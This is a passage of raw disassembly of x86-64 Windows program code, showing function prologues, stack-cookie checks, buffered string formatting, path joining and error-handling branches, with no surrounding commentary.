   140003cbf:	48 8d 0d f2 83 02 00 	lea    0x283f2(%rip),%rcx        # 0x14002c0b8
   140003cc6:	eb a0                	jmp    0x140003c68
   140003cc8:	48 8d 9f 22 20 00 00 	lea    0x2022(%rdi),%rbx
   140003ccf:	e9 b3 00 00 00       	jmp    0x140003d87
   140003cd4:	48 8d 0d ed 82 02 00 	lea    0x282ed(%rip),%rcx        # 0x14002bfc8
   140003cdb:	e8 50 4b 00 00       	call   0x140008830
   140003ce0:	48 8b f0             	mov    %rax,%rsi
   140003ce3:	48 85 c0             	test   %rax,%rax
   140003ce6:	74 4d                	je     0x140003d35
   140003ce8:	80 38 00             	cmpb   $0x0,(%rax)
   140003ceb:	74 48                	je     0x140003d35
   140003ced:	48 8d 9f 22 20 00 00 	lea    0x2022(%rdi),%rbx
   140003cf4:	4c 8b c8             	mov    %rax,%r9
   140003cf7:	48 8b cb             	mov    %rbx,%rcx
   140003cfa:	4c 8d 05 7b 7d 02 00 	lea    0x27d7b(%rip),%r8        # 0x14002ba7c
   140003d01:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003d06:	e8 75 df ff ff       	call   0x140001c80
   140003d0b:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140003d10:	7c 19                	jl     0x140003d2b
   140003d12:	48 8d 0d 07 84 02 00 	lea    0x28407(%rip),%rcx        # 0x14002c120
   140003d19:	e8 f2 e9 ff ff       	call   0x140002710
   140003d1e:	48 8b ce             	mov    %rsi,%rcx
   140003d21:	e8 0a 12 01 00       	call   0x140014f30
   140003d26:	e9 42 ff ff ff       	jmp    0x140003c6d
   140003d2b:	48 8b ce             	mov    %rsi,%rcx
   140003d2e:	e8 fd 11 01 00       	call   0x140014f30
   140003d33:	eb 52                	jmp    0x140003d87
   140003d35:	48 8d 0d a4 83 02 00 	lea    0x283a4(%rip),%rcx        # 0x14002c0e0
   140003d3c:	e9 27 ff ff ff       	jmp    0x140003c68
   140003d41:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140003d45:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003d4a:	e8 91 07 00 00       	call   0x1400044e0
   140003d4f:	4c 8b 87 70 30 00 00 	mov    0x3070(%rdi),%r8
   140003d56:	48 8d 9f 22 20 00 00 	lea    0x2022(%rdi),%rbx
   140003d5d:	48 8b cb             	mov    %rbx,%rcx
   140003d60:	4d 85 c0             	test   %r8,%r8
   140003d63:	74 0c                	je     0x140003d71
   140003d65:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140003d6a:	e8 c1 08 00 00       	call   0x140004630
   140003d6f:	eb 16                	jmp    0x140003d87
   140003d71:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140003d76:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003d7b:	4c 8d 05 fa 7c 02 00 	lea    0x27cfa(%rip),%r8        # 0x14002ba7c
   140003d82:	e8 f9 de ff ff       	call   0x140001c80
   140003d87:	48 8b 87 10 20 00 00 	mov    0x2010(%rdi),%rax
   140003d8e:	48 83 b8 20 10 00 00 	cmpq   $0x0,0x1020(%rax)
   140003d95:	00 
   140003d96:	74 24                	je     0x140003dbc
   140003d98:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003d9f:	74 1b                	je     0x140003dbc
   140003da1:	41 80 3e 00          	cmpb   $0x0,(%r14)
   140003da5:	75 15                	jne    0x140003dbc
   140003da7:	33 d2                	xor    %edx,%edx
   140003da9:	48 8d 0d 98 83 02 00 	lea    0x28398(%rip),%rcx        # 0x14002c148
   140003db0:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003db6:	ff 15 24 73 02 00    	call   *0x27324(%rip)        # 0x14002b0e0
   140003dbc:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003dc2:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140003dc7:	48 8b cb             	mov    %rbx,%rcx
   140003dca:	e8 c1 55 00 00       	call   0x140009390
   140003dcf:	48 85 c0             	test   %rax,%rax
   140003dd2:	75 0c                	jne    0x140003de0
   140003dd4:	48 8d 0d 95 83 02 00 	lea    0x28395(%rip),%rcx        # 0x14002c170
   140003ddb:	e9 88 fe ff ff       	jmp    0x140003c68
   140003de0:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003de5:	ff 15 fd 72 02 00    	call   *0x272fd(%rip)        # 0x14002b0e8
   140003deb:	48 8b 87 10 20 00 00 	mov    0x2010(%rdi),%rax
   140003df2:	32 db                	xor    %bl,%bl
   140003df4:	48 83 b8 20 10 00 00 	cmpq   $0x0,0x1020(%rax)
   140003dfb:	00 
   140003dfc:	0f 84 f7 00 00 00    	je     0x140003ef9
   140003e02:	48 8d 0d ff 83 02 00 	lea    0x283ff(%rip),%rcx        # 0x14002c208
   140003e09:	e8 22 4a 00 00       	call   0x140008830
   140003e0e:	48 85 c0             	test   %rax,%rax
   140003e11:	74 17                	je     0x140003e2a
   140003e13:	0f b6 10             	movzbl (%rax),%edx
   140003e16:	83 ea 31             	sub    $0x31,%edx
   140003e19:	75 0a                	jne    0x140003e25
   140003e1b:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   140003e1f:	41 0f b6 cf          	movzbl %r15b,%ecx
   140003e23:	2b d1                	sub    %ecx,%edx
   140003e25:	85 d2                	test   %edx,%edx
   140003e27:	0f 94 c3             	sete   %bl
   140003e2a:	48 8b c8             	mov    %rax,%rcx
   140003e2d:	e8 fe 10 01 00       	call   0x140014f30
   140003e32:	84 db                	test   %bl,%bl
   140003e34:	0f 85 b0 00 00 00    	jne    0x140003eea
   140003e3a:	41 0f b6 06          	movzbl (%r14),%eax
   140003e3e:	3c 02                	cmp    $0x2,%al
   140003e40:	0f 83 a4 00 00 00    	jae    0x140003eea
   140003e46:	38 9f 20 20 00 00    	cmp    %bl,0x2020(%rdi)
   140003e4c:	74 09                	je     0x140003e57
   140003e4e:	84 c0                	test   %al,%al
   140003e50:	74 0d                	je     0x140003e5f
   140003e52:	e9 a2 00 00 00       	jmp    0x140003ef9
   140003e57:	3c 01                	cmp    $0x1,%al
   140003e59:	0f 85 9a 00 00 00    	jne    0x140003ef9
   140003e5f:	e8 5c 2f 00 00       	call   0x140006dc0
   140003e64:	48 8d 9f 18 20 00 00 	lea    0x2018(%rdi),%rbx
   140003e6b:	48 8b d7             	mov    %rdi,%rdx
   140003e6e:	48 8b c8             	mov    %rax,%rcx
   140003e71:	48 89 03             	mov    %rax,(%rbx)
   140003e74:	e8 c7 34 00 00       	call   0x140007340
   140003e79:	85 c0                	test   %eax,%eax
   140003e7b:	74 09                	je     0x140003e86
   140003e7d:	48 8d 0d ac 83 02 00 	lea    0x283ac(%rip),%rcx        # 0x14002c230
   140003e84:	eb 4d                	jmp    0x140003ed3
   140003e86:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003e8d:	74 18                	je     0x140003ea7
   140003e8f:	48 8b 0b             	mov    (%rbx),%rcx
   140003e92:	48 8b d7             	mov    %rdi,%rdx
   140003e95:	e8 66 2f 00 00       	call   0x140006e00
   140003e9a:	85 c0                	test   %eax,%eax
   140003e9c:	74 09                	je     0x140003ea7
   140003e9e:	48 8d 0d bb 83 02 00 	lea    0x283bb(%rip),%rcx        # 0x14002c260
   140003ea5:	eb 2c                	jmp    0x140003ed3
   140003ea7:	48 8b 0b             	mov    (%rbx),%rcx
   140003eaa:	e8 01 33 00 00       	call   0x1400071b0
   140003eaf:	85 c0                	test   %eax,%eax
   140003eb1:	74 09                	je     0x140003ebc
   140003eb3:	48 8d 0d e6 83 02 00 	lea    0x283e6(%rip),%rcx        # 0x14002c2a0
   140003eba:	eb 17                	jmp    0x140003ed3
   140003ebc:	48 8b 0b             	mov    (%rbx),%rcx
   140003ebf:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140003ec3:	e8 28 36 00 00       	call   0x1400074f0
   140003ec8:	85 c0                	test   %eax,%eax
   140003eca:	74 2d                	je     0x140003ef9
   140003ecc:	48 8d 0d 0d 84 02 00 	lea    0x2840d(%rip),%rcx        # 0x14002c2e0
   140003ed3:	e8 78 eb ff ff       	call   0x140002a50
   140003ed8:	48 8b 0b             	mov    (%rbx),%rcx
   140003edb:	e8 e0 30 00 00       	call   0x140006fc0
   140003ee0:	48 8b cb             	mov    %rbx,%rcx
   140003ee3:	e8 88 2e 00 00       	call   0x140006d70
   140003ee8:	eb 0f                	jmp    0x140003ef9
   140003eea:	49 8b d5             	mov    %r13,%rdx
   140003eed:	48 8d 0d 14 81 02 00 	lea    0x28114(%rip),%rcx        # 0x14002c008
   140003ef4:	e8 47 4a 00 00       	call   0x140008940
   140003ef9:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003f00:	0f 84 fa 00 00 00    	je     0x140004000
   140003f06:	80 bf 21 20 00 00 00 	cmpb   $0x0,0x2021(%rdi)
   140003f0d:	0f 85 ed 00 00 00    	jne    0x140004000
   140003f13:	48 8b cf             	mov    %rdi,%rcx
   140003f16:	e8 a5 f4 ff ff       	call   0x1400033c0
   140003f1b:	85 c0                	test   %eax,%eax
   140003f1d:	0f 88 4a fd ff ff    	js     0x140003c6d
   140003f23:	48 8d 8f 38 30 00 00 	lea    0x3038(%rdi),%rcx
   140003f2a:	e8 91 51 00 00       	call   0x1400090c0
   140003f2f:	48 83 bf 18 20 00 00 	cmpq   $0x0,0x2018(%rdi)
   140003f36:	00 
   140003f37:	75 23                	jne    0x140003f5c
   140003f39:	45 33 c9             	xor    %r9d,%r9d
   140003f3c:	45 33 c0             	xor    %r8d,%r8d
   140003f3f:	33 d2                	xor    %edx,%edx
   140003f41:	33 c9                	xor    %ecx,%ecx
   140003f43:	ff 15 bf 74 02 00    	call   *0x274bf(%rip)        # 0x14002b408
   140003f49:	45 33 c9             	xor    %r9d,%r9d
   140003f4c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003f51:	45 33 c0             	xor    %r8d,%r8d
   140003f54:	33 d2                	xor    %edx,%edx
   140003f56:	ff 15 b4 74 02 00    	call   *0x274b4(%rip)        # 0x14002b410
   140003f5c:	48 8d 97 22 20 00 00 	lea    0x2022(%rdi),%rdx
   140003f63:	48 8d 0d 5e 80 02 00 	lea    0x2805e(%rip),%rcx        # 0x14002bfc8
   140003f6a:	e8 d1 49 00 00       	call   0x140008940
   140003f6f:	48 8b cf             	mov    %rdi,%rcx
   140003f72:	e8 69 4a 00 00       	call   0x1400089e0
   140003f77:	48 8b 8f 18 20 00 00 	mov    0x2018(%rdi),%rcx
   140003f7e:	8b f0                	mov    %eax,%esi
   140003f80:	e8 3b 30 00 00       	call   0x140006fc0
   140003f85:	48 8d 8f 18 20 00 00 	lea    0x2018(%rdi),%rcx
   140003f8c:	e8 df 2d 00 00       	call   0x140006d70
   140003f91:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   140003f98:	e8 43 49 00 00       	call   0x1400088e0
   140003f9d:	85 c0                	test   %eax,%eax
   140003f9f:	79 4c                	jns    0x140003fed
   140003fa1:	48 8b cf             	mov    %rdi,%rcx
   140003fa4:	e8 27 4f 00 00       	call   0x140008ed0
   140003fa9:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   140003fb0:	e8 2b 49 00 00       	call   0x1400088e0
   140003fb5:	85 c0                	test   %eax,%eax
   140003fb7:	79 34                	jns    0x140003fed
   140003fb9:	80 bf 31 30 00 00 00 	cmpb   $0x0,0x3031(%rdi)
   140003fc0:	48 8d 97 22 20 00 00 	lea    0x2022(%rdi),%rdx
   140003fc7:	48 8d 0d 32 83 02 00 	lea    0x28332(%rip),%rcx        # 0x14002c300
   140003fce:	74 18                	je     0x140003fe8
   140003fd0:	e8 3b e7 ff ff       	call   0x140002710
   140003fd5:	48 8d 8f 10 20 00 00 	lea    0x2010(%rdi),%rcx
   140003fdc:	e8 1f d9 ff ff       	call   0x140001900
   140003fe1:	8b f5                	mov    %ebp,%esi
   140003fe3:	e9 85 fc ff ff       	jmp    0x140003c6d
   140003fe8:	e8 63 ea ff ff       	call   0x140002a50
   140003fed:	48 8d 8f 10 20 00 00 	lea    0x2010(%rdi),%rcx
   140003ff4:	e8 07 d9 ff ff       	call   0x140001900
   140003ff9:	8b ee                	mov    %esi,%ebp
   140003ffb:	e9 6d fc ff ff       	jmp    0x140003c6d
   140004000:	48 83 bf 18 20 00 00 	cmpq   $0x0,0x2018(%rdi)
   140004007:	00 
   140004008:	75 23                	jne    0x14000402d
   14000400a:	45 33 c9             	xor    %r9d,%r9d
   14000400d:	45 33 c0             	xor    %r8d,%r8d
   140004010:	33 d2                	xor    %edx,%edx
   140004012:	33 c9                	xor    %ecx,%ecx
   140004014:	ff 15 ee 73 02 00    	call   *0x273ee(%rip)        # 0x14002b408
   14000401a:	45 33 c9             	xor    %r9d,%r9d
   14000401d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004022:	45 33 c0             	xor    %r8d,%r8d
   140004025:	33 d2                	xor    %edx,%edx
   140004027:	ff 15 e3 73 02 00    	call   *0x273e3(%rip)        # 0x14002b410
   14000402d:	48 8b cf             	mov    %rdi,%rcx
   140004030:	e8 6b f6 ff ff       	call   0x1400036a0
   140004035:	48 8b cf             	mov    %rdi,%rcx
   140004038:	e8 23 f3 ff ff       	call   0x140003360
   14000403d:	48 8b cf             	mov    %rdi,%rcx
   140004040:	8b d8                	mov    %eax,%ebx
   140004042:	e8 29 f6 ff ff       	call   0x140003670
   140004047:	48 8b 8f 18 20 00 00 	mov    0x2018(%rdi),%rcx
   14000404e:	e8 6d 2f 00 00       	call   0x140006fc0
   140004053:	48 8d 8f 18 20 00 00 	lea    0x2018(%rdi),%rcx
   14000405a:	e8 11 2d 00 00       	call   0x140006d70
   14000405f:	8b c3                	mov    %ebx,%eax
   140004061:	e9 09 fc ff ff       	jmp    0x140003c6f
   140004066:	cc                   	int3
   140004067:	cc                   	int3
   140004068:	cc                   	int3
   140004069:	cc                   	int3
   14000406a:	cc                   	int3
   14000406b:	cc                   	int3
   14000406c:	cc                   	int3
   14000406d:	cc                   	int3
   14000406e:	cc                   	int3
   14000406f:	cc                   	int3
   140004070:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004075:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000407a:	57                   	push   %rdi
   14000407b:	48 83 ec 20          	sub    $0x20,%rsp
   14000407f:	48 8b f9             	mov    %rcx,%rdi
   140004082:	33 f6                	xor    %esi,%esi
   140004084:	48 8b 89 18 20 00 00 	mov    0x2018(%rcx),%rcx
   14000408b:	e8 30 2f 00 00       	call   0x140006fc0
   140004090:	48 8d 8f 18 20 00 00 	lea    0x2018(%rdi),%rcx
   140004097:	e8 d4 2c 00 00       	call   0x140006d70
   14000409c:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   1400040a3:	e8 38 48 00 00       	call   0x1400088e0
   1400040a8:	85 c0                	test   %eax,%eax
   1400040aa:	79 40                	jns    0x1400040ec
   1400040ac:	48 8b cf             	mov    %rdi,%rcx
   1400040af:	e8 1c 4e 00 00       	call   0x140008ed0
   1400040b4:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   1400040bb:	e8 20 48 00 00       	call   0x1400088e0
   1400040c0:	85 c0                	test   %eax,%eax
   1400040c2:	79 28                	jns    0x1400040ec
   1400040c4:	48 8d 97 22 20 00 00 	lea    0x2022(%rdi),%rdx
   1400040cb:	48 8d 0d 2e 82 02 00 	lea    0x2822e(%rip),%rcx        # 0x14002c300
   1400040d2:	40 38 b7 31 30 00 00 	cmp    %sil,0x3031(%rdi)
   1400040d9:	74 0c                	je     0x1400040e7
   1400040db:	e8 30 e6 ff ff       	call   0x140002710
   1400040e0:	be ff ff ff ff       	mov    $0xffffffff,%esi
   1400040e5:	eb 05                	jmp    0x1400040ec
   1400040e7:	e8 64 e9 ff ff       	call   0x140002a50
   1400040ec:	48 8d 8f 10 20 00 00 	lea    0x2010(%rdi),%rcx
   1400040f3:	e8 08 d8 ff ff       	call   0x140001900
   1400040f8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400040fd:	8b c6                	mov    %esi,%eax
   1400040ff:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004104:	48 83 c4 20          	add    $0x20,%rsp
   140004108:	5f                   	pop    %rdi
   140004109:	c3                   	ret
   14000410a:	cc                   	int3
   14000410b:	cc                   	int3
   14000410c:	cc                   	int3
   14000410d:	cc                   	int3
   14000410e:	cc                   	int3
   14000410f:	cc                   	int3
   140004110:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140004115:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   14000411a:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000411f:	53                   	push   %rbx
   140004120:	56                   	push   %rsi
   140004121:	57                   	push   %rdi
   140004122:	48 83 ec 30          	sub    $0x30,%rsp
   140004126:	48 8b da             	mov    %rdx,%rbx
   140004129:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   14000412e:	48 8b f9             	mov    %rcx,%rdi
   140004131:	e8 0a cf ff ff       	call   0x140001040
   140004136:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   14000413b:	4c 8b cb             	mov    %rbx,%r9
   14000413e:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004144:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000414b:	00 00 
   14000414d:	48 8b d7             	mov    %rdi,%rdx
   140004150:	48 8b 08             	mov    (%rax),%rcx
   140004153:	48 83 c9 02          	or     $0x2,%rcx
   140004157:	e8 28 08 01 00       	call   0x140014984
   14000415c:	85 c0                	test   %eax,%eax
   14000415e:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140004163:	0f 48 c1             	cmovs  %ecx,%eax
   140004166:	3d 00 10 00 00       	cmp    $0x1000,%eax
   14000416b:	7c 0a                	jl     0x140004177
   14000416d:	8b c1                	mov    %ecx,%eax
   14000416f:	48 83 c4 30          	add    $0x30,%rsp
   140004173:	5f                   	pop    %rdi
   140004174:	5e                   	pop    %rsi
   140004175:	5b                   	pop    %rbx
   140004176:	c3                   	ret
   140004177:	48 8b cf             	mov    %rdi,%rcx
   14000417a:	e8 e1 03 00 00       	call   0x140004560
   14000417f:	48 83 c4 30          	add    $0x30,%rsp
   140004183:	5f                   	pop    %rdi
   140004184:	5e                   	pop    %rsi
   140004185:	5b                   	pop    %rbx
   140004186:	c3                   	ret
   140004187:	cc                   	int3
   140004188:	cc                   	int3
   140004189:	cc                   	int3
   14000418a:	cc                   	int3
   14000418b:	cc                   	int3
   14000418c:	cc                   	int3
   14000418d:	cc                   	int3
   14000418e:	cc                   	int3
   14000418f:	cc                   	int3
   140004190:	40 53                	rex push %rbx
   140004192:	55                   	push   %rbp
   140004193:	56                   	push   %rsi
   140004194:	57                   	push   %rdi
   140004195:	41 56                	push   %r14
   140004197:	b8 60 40 00 00       	mov    $0x4060,%eax
   14000419c:	e8 af 86 00 00       	call   0x14000c850
   1400041a1:	48 2b e0             	sub    %rax,%rsp
   1400041a4:	48 8b 05 95 9e 03 00 	mov    0x39e95(%rip),%rax        # 0x14003e040
   1400041ab:	48 33 c4             	xor    %rsp,%rax
   1400041ae:	48 89 84 24 50 40 00 	mov    %rax,0x4050(%rsp)
   1400041b5:	00 
   1400041b6:	4c 8b b4 24 b0 40 00 	mov    0x40b0(%rsp),%r14
   1400041bd:	00 
   1400041be:	48 8b f2             	mov    %rdx,%rsi
   1400041c1:	48 8d 51 10          	lea    0x10(%rcx),%rdx
   1400041c5:	48 8b d9             	mov    %rcx,%rbx
   1400041c8:	48 8d 8c 24 50 10 00 	lea    0x1050(%rsp),%rcx
   1400041cf:	00 
   1400041d0:	49 8b e9             	mov    %r9,%rbp
   1400041d3:	49 8b f8             	mov    %r8,%rdi
   1400041d6:	e8 05 03 00 00       	call   0x1400044e0
   1400041db:	48 8b d7             	mov    %rdi,%rdx
   1400041de:	48 8d 8c 24 50 30 00 	lea    0x3050(%rsp),%rcx
   1400041e5:	00 
   1400041e6:	e8 f5 02 00 00       	call   0x1400044e0
   1400041eb:	48 8b 83 70 30 00 00 	mov    0x3070(%rbx),%rax
   1400041f2:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   1400041f9:	00 
   1400041fa:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   140004201:	00 
   140004202:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   140004208:	48 85 c0             	test   %rax,%rax
   14000420b:	74 2f                	je     0x14000423c
   14000420d:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   140004212:	48 8d 15 37 83 02 00 	lea    0x28337(%rip),%rdx        # 0x14002c550
   140004219:	44 89 4c 24 38       	mov    %r9d,0x38(%rsp)
   14000421e:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004223:	48 8d 84 24 50 30 00 	lea    0x3050(%rsp),%rax
   14000422a:	00 
   14000422b:	44 89 4c 24 28       	mov    %r9d,0x28(%rsp)
   140004230:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004235:	e8 d6 fe ff ff       	call   0x140004110
   14000423a:	eb 26                	jmp    0x140004262
   14000423c:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140004241:	48 8d 84 24 50 30 00 	lea    0x3050(%rsp),%rax
   140004248:	00 
   140004249:	c7 44 24 28 5c 00 00 	movl   $0x5c,0x28(%rsp)
   140004250:	00 
   140004251:	48 8d 15 08 83 02 00 	lea    0x28308(%rip),%rdx        # 0x14002c560
   140004258:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000425d:	e8 ae fe ff ff       	call   0x140004110
   140004262:	83 f8 01             	cmp    $0x1,%eax
   140004265:	75 35                	jne    0x14000429c
   140004267:	49 8b d6             	mov    %r14,%rdx
   14000426a:	48 8d 8c 24 50 20 00 	lea    0x2050(%rsp),%rcx
   140004271:	00 
   140004272:	e8 79 3a 00 00       	call   0x140007cf0
   140004277:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000427a:	0f 85 7a 01 00 00    	jne    0x1400043fa
   140004280:	4c 8d 84 24 50 20 00 	lea    0x2050(%rsp),%r8
   140004287:	00 
   140004288:	48 8b d5             	mov    %rbp,%rdx
   14000428b:	48 8d 0d de 82 02 00 	lea    0x282de(%rip),%rcx        # 0x14002c570
   140004292:	e8 79 e4 ff ff       	call   0x140002710
   140004297:	e9 84 01 00 00       	jmp    0x140004420
   14000429c:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   1400042a2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400042a7:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   1400042ae:	00 
   1400042af:	48 8d 15 e2 82 02 00 	lea    0x282e2(%rip),%rdx        # 0x14002c598
   1400042b6:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400042bb:	e8 50 fe ff ff       	call   0x140004110
   1400042c0:	83 f8 01             	cmp    $0x1,%eax
   1400042c3:	74 61                	je     0x140004326
   1400042c5:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   1400042cb:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400042d0:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   1400042d7:	00 
   1400042d8:	48 8d 15 c9 82 02 00 	lea    0x282c9(%rip),%rdx        # 0x14002c5a8
   1400042df:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400042e4:	e8 27 fe ff ff       	call   0x140004110
   1400042e9:	83 f8 01             	cmp    $0x1,%eax
   1400042ec:	74 38                	je     0x140004326
   1400042ee:	41 b9 5c 00 00 00    	mov    $0x5c,%r9d
   1400042f4:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400042f9:	4c 8d 84 24 50 10 00 	lea    0x1050(%rsp),%r8
   140004300:	00 
   140004301:	48 8d 15 5c 7a 02 00 	lea    0x27a5c(%rip),%rdx        # 0x14002bd64
   140004308:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000430d:	e8 fe fd ff ff       	call   0x140004110
   140004312:	83 f8 01             	cmp    $0x1,%eax
   140004315:	74 0f                	je     0x140004326
   140004317:	48 8b d7             	mov    %rdi,%rdx
   14000431a:	48 8d 0d 97 82 02 00 	lea    0x28297(%rip),%rcx        # 0x14002c5b8
   140004321:	e9 f5 00 00 00       	jmp    0x14000441b
   140004326:	48 8b 1e             	mov    (%rsi),%rbx
   140004329:	33 ff                	xor    %edi,%edi
   14000432b:	48 85 db             	test   %rbx,%rbx
   14000432e:	74 63                	je     0x140004393
   140004330:	44 8b cf             	mov    %edi,%r9d
   140004333:	0f 1f 40 00          	nopl   0x0(%rax)
   140004337:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000433e:	00 00 
   140004340:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140004345:	48 8b c3             	mov    %rbx,%rax
   140004348:	4c 2b c3             	sub    %rbx,%r8
   14000434b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004350:	0f b6 10             	movzbl (%rax),%edx
   140004353:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   140004358:	2b d1                	sub    %ecx,%edx
   14000435a:	75 07                	jne    0x140004363
   14000435c:	48 ff c0             	inc    %rax
   14000435f:	85 c9                	test   %ecx,%ecx
   140004361:	75 ed                	jne    0x140004350
   140004363:	85 d2                	test   %edx,%edx
   140004365:	74 25                	je     0x14000438c
   140004367:	4a 8b 5c ce 08       	mov    0x8(%rsi,%r9,8),%rbx
   14000436c:	49 ff c1             	inc    %r9
   14000436f:	ff c7                	inc    %edi
   140004371:	48 85 db             	test   %rbx,%rbx
   140004374:	75 ca                	jne    0x140004340
   140004376:	83 ff 14             	cmp    $0x14,%edi
   140004379:	7c 18                	jl     0x140004393
   14000437b:	48 8d 0d 86 81 02 00 	lea    0x28186(%rip),%rcx        # 0x14002c508
   140004382:	e8 89 e3 ff ff       	call   0x140002710
   140004387:	e9 83 00 00 00       	jmp    0x14000440f
   14000438c:	48 85 db             	test   %rbx,%rbx
   14000438f:	75 1b                	jne    0x1400043ac
   140004391:	eb 7c                	jmp    0x14000440f
   140004393:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004398:	e8 b3 d5 ff ff       	call   0x140001950
   14000439d:	48 8b d8             	mov    %rax,%rbx
   1400043a0:	48 85 c0             	test   %rax,%rax
   1400043a3:	74 59                	je     0x1400043fe
   1400043a5:	48 63 c7             	movslq %edi,%rax
   1400043a8:	48 89 1c c6          	mov    %rbx,(%rsi,%rax,8)
   1400043ac:	48 8b d5             	mov    %rbp,%rdx
   1400043af:	48 8b cb             	mov    %rbx,%rcx
   1400043b2:	e8 89 d4 ff ff       	call   0x140001840
   1400043b7:	48 85 c0             	test   %rax,%rax
   1400043ba:	75 16                	jne    0x1400043d2
   1400043bc:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400043c1:	48 8b d5             	mov    %rbp,%rdx
   1400043c4:	48 8d 0d 55 82 02 00 	lea    0x28255(%rip),%rcx        # 0x14002c620
   1400043cb:	e8 40 e3 ff ff       	call   0x140002710
   1400043d0:	eb 4e                	jmp    0x140004420
   1400043d2:	4d 8b c6             	mov    %r14,%r8
   1400043d5:	48 8b d0             	mov    %rax,%rdx
   1400043d8:	48 8b cb             	mov    %rbx,%rcx
   1400043db:	e8 20 d2 ff ff       	call   0x140001600
   1400043e0:	85 c0                	test   %eax,%eax
   1400043e2:	79 16                	jns    0x1400043fa
   1400043e4:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400043e9:	48 8b d5             	mov    %rbp,%rdx
   1400043ec:	48 8d 0d 6d 82 02 00 	lea    0x2826d(%rip),%rcx        # 0x14002c660
   1400043f3:	e8 18 e3 ff ff       	call   0x140002710
   1400043f8:	eb 26                	jmp    0x140004420
   1400043fa:	33 c0                	xor    %eax,%eax
   1400043fc:	eb 27                	jmp    0x140004425
   1400043fe:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004403:	48 8d 0d 26 81 02 00 	lea    0x28126(%rip),%rcx        # 0x14002c530
   14000440a:	e8 01 e3 ff ff       	call   0x140002710
   14000440f:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004414:	48 8d 0d cd 81 02 00 	lea    0x281cd(%rip),%rcx        # 0x14002c5e8
   14000441b:	e8 f0 e2 ff ff       	call   0x140002710
   140004420:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004425:	48 8b 8c 24 50 40 00 	mov    0x4050(%rsp),%rcx
   14000442c:	00 
   14000442d:	48 33 cc             	xor    %rsp,%rcx
   140004430:	e8 1b 81 00 00       	call   0x14000c550
   140004435:	48 81 c4 60 40 00 00 	add    $0x4060,%rsp
   14000443c:	41 5e                	pop    %r14
   14000443e:	5f                   	pop    %rdi
   14000443f:	5e                   	pop    %rsi
   140004440:	5d                   	pop    %rbp
   140004441:	5b                   	pop    %rbx
   140004442:	c3                   	ret
   140004443:	cc                   	int3
   140004444:	cc                   	int3
   140004445:	cc                   	int3
   140004446:	cc                   	int3
   140004447:	cc                   	int3
   140004448:	cc                   	int3
   140004449:	cc                   	int3
   14000444a:	cc                   	int3
   14000444b:	cc                   	int3
   14000444c:	cc                   	int3
   14000444d:	cc                   	int3
   14000444e:	cc                   	int3
   14000444f:	cc                   	int3
   140004450:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004455:	57                   	push   %rdi
   140004456:	48 83 ec 20          	sub    $0x20,%rsp
